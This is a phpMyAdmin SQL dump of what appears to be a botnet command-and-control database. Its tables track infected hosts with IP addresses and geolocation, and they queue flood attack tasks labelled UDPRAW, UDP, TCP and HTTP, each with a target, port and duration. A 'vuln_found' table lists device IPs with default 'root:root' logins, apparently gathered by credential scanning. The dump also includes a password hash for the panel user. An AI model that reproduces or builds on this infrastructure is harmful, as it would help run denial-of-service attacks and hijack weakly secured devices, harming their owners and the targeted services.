-- phpMyAdmin SQL Dump
-- version 5.1.3
-- https://www.phpmyadmin.net/
--
-- Hôte : localhost
-- Généré le : lun. 28 mars 2022 à 08:04
-- Version du serveur : 10.3.34-MariaDB-0ubuntu0.20.04.1
-- Version de PHP : 7.4.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données : `gFDSG`
--

-- --------------------------------------------------------

--
-- Structure de la table `chat`
--

CREATE TABLE `chat` (
  `user` varchar(50) DEFAULT NULL,
  `date` varchar(100) DEFAULT NULL,
  `message` mediumtext DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Structure de la table `hosts`
--

CREATE TABLE `hosts` (
  `id` int(5) NOT NULL,
  `hostname` varchar(100) DEFAULT NULL,
  `date` varchar(100) DEFAULT NULL,
  `date-create` text DEFAULT NULL,
  `ip` text DEFAULT NULL,
  `status` text DEFAULT NULL,
  `geoloc` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Déchargement des données de la table `hosts`
--

INSERT INTO `hosts` (`id`, `hostname`, `date`, `date-create`, `ip`, `status`, `geoloc`) VALUES
(6, 'a1fbfe6b56f5b7419528a49061a40b28', '2022-03-28 06:39:31', '2022-03-26 22:34:39', '5.51.185.103', 'disconnected', '45.748, 4.85'),
(7, 'b7414bc45f7243a1ae9c31df87fbbe1e', '2022-03-27 00:15:15', '2022-03-26 22:35:18', '5.51.185.103', 'disconnected', '45.748, 4.85'),
(8, '0b0996e140eb4006a9dd257e4fc01dee', '2022-03-28 06:37:40', '2022-03-26 22:35:57', '5.51.185.103', 'disconnected', '51.1878, 6.8607');

-- --------------------------------------------------------

--
-- Structure de la table `output`
--

CREATE TABLE `output` (
  `id` int(16) NOT NULL,
  `user` varchar(50) DEFAULT NULL,
  `hostname` varchar(100) DEFAULT NULL,
  `action` varchar(20) DEFAULT NULL,
  `secondary` mediumtext DEFAULT NULL,
  `stdout` mediumtext DEFAULT NULL,
  `stderr` mediumtext DEFAULT NULL,
  `status` varchar(1) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Déchargement des données de la table `output`
--

INSERT INTO `output` (`id`, `user`, `hostname`, `action`, `secondary`, `stdout`, `stderr`, `status`) VALUES
(46, 'test', 'a1fbfe6b56f5b7419528a49061a40b28', 'junk', '127.0.0.1:80:188', NULL, NULL, 'N'),
(47, 'test', '0b0996e140eb4006a9dd257e4fc01dee', 'HTTP', '127.0.0.1:80:10:http://blabla.com:POST', NULL, NULL, 'N'),
(48, 'test', '0b0996e140eb4006a9dd257e4fc01dee', 'TCP', '127.0.0.1:80:184', NULL, NULL, 'N'),
(49, 'test', '0b0996e140eb4006a9dd257e4fc01dee', 'HTTP', '192.168.1.69:80:10:/:POST:75', NULL, NULL, 'N'),
(50, 'test', 'a1fbfe6b56f5b7419528a49061a40b28', 'UDPRAW', '192.168.1.69:92:10', NULL, NULL, 'N'),
(51, 'test', '0b0996e140eb4006a9dd257e4fc01dee', 'UDP', 'a:b:10', NULL, NULL, 'N');

-- --------------------------------------------------------

--
-- Structure de la table `tasks`
--

CREATE TABLE `tasks` (
  `id` int(16) NOT NULL,
  `user` varchar(50) DEFAULT NULL,
  `hostname` varchar(100) DEFAULT NULL,
  `action` varchar(20) DEFAULT NULL,
  `secondary` mediumtext DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Déchargement des données de la table `tasks`
--

INSERT INTO `tasks` (`id`, `user`, `hostname`, `action`, `secondary`) VALUES
(55, 'test', 'a1fbfe6b56f5b7419528a49061a40b28', 'UDPRAW', '192.168.1.69:92:10');

-- --------------------------------------------------------

--
-- Structure de la table `users`
--

CREATE TABLE `users` (
  `id` int(10) NOT NULL,
  `username` varchar(128) NOT NULL,
  `password` varchar(128) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Déchargement des données de la table `users`
--

INSERT INTO `users` (`id`, `username`, `password`) VALUES
(1, 'test', '$2y$10$9irGCfHDrSDFo94nGMbPY.MtLVkFPw6c.8LqXMnSXHwHekvSJ8TK2');

-- --------------------------------------------------------

--
-- Structure de la table `vuln_found`
--

CREATE TABLE `vuln_found` (
  `id` int(11) NOT NULL,
  `combo` text DEFAULT NULL,
  `ip` text NOT NULL,
  `date` text DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `vuln_found`
--

INSERT INTO `vuln_found` (`id`, `combo`, `ip`, `date`) VALUES
(1, '056.153.005.118:root:root', '192.168.1.53', '2022-03-26 10:51:59'),
(4, '218.153.050.129:root:root', '5.51.185.103', '2022-03-27 01:33:13');

--
-- Index pour les tables déchargées
--

--
-- Index pour la table `hosts`
--
ALTER TABLE `hosts`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `output`
--
ALTER TABLE `output`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `tasks`
--
ALTER TABLE `tasks`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `vuln_found`
--
ALTER TABLE `vuln_found`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT pour les tables déchargées
--

--
-- AUTO_INCREMENT pour la table `hosts`
--
ALTER TABLE `hosts`
  MODIFY `id` int(5) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT pour la table `output`
--
ALTER TABLE `output`
  MODIFY `id` int(16) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=52;

--
-- AUTO_INCREMENT pour la table `tasks`
--
ALTER TABLE `tasks`
  MODIFY `id` int(16) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=57;

--
-- AUTO_INCREMENT pour la table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT pour la table `vuln_found`
--
ALTER TABLE `vuln_found`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
